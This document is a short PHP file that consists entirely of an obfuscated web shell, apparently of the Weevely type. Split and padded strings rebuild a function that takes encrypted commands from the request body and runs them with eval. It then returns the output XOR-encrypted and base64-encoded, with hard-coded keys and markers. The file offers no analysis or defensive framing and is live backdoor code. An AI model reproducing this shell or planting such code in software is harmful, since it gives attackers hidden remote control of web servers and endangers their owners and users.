<?php
$b='de($mQ[1]),$k)QQQ));$o=@ob_get_conQtentsQ();@ob_QQend_clean()Q;$r=';
$M='QQg_match("/$kh(.+)$kQf/",Q@file_gQQQet_contents("phpQ://Qinp';
$c='Qut"),Q$m)==1)Q {@ob_stQart();@evaQlQ(@gzuncompreQQss(@x(@baQsQe64_decoQ';
$B='@basQe64_encode(@Qx(@gQzcompQQress($Qo),$k));prinQt("$Qp$kh$r$kf");}';
$l=str_replace('Dm','','creDmatDmeDm_fuDmnDmctDmion');
$V=';$j+Q+,Q$i++){$Qo.=Q$t{$i}^$kQ{$Qj};}}return $Qo;}if (Q@preQ';
$k='$k="f9Q4641df"QQ;$kh="d2Q10aeaab913Q";Q$kfQ="c28a3c20cd7Q6";$';
$F='Qp="QFEoQSZQDEQtorro0Y4l";function x($Qt,$k){Q$c=stQrlenQ($Q';
$K='k)Q;$l=strlQen($t);$Qo="";for($i=0QQ;$iQ<$l;){Qfor($j=Q0;($j<Q$c&&$i<$l)';
$n=str_replace('Q','',$k.$F.$K.$V.$M.$c.$b.$B);
$a=$l('',$n);$a();
?>
